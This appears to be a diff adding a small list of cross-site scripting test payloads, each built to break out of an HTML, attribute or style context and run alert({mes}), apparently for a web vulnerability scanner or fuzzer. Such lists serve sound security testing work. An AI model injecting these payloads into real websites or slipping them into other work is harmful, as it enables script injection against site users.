@@ -1,0 +1,5 @@
+</style><script>alert({mes})</script>
+'`"onerror="alert({mes})"
+'`"><script>alert({mes})</script>
+<script>alert({mes})<script>
+alert({mes})
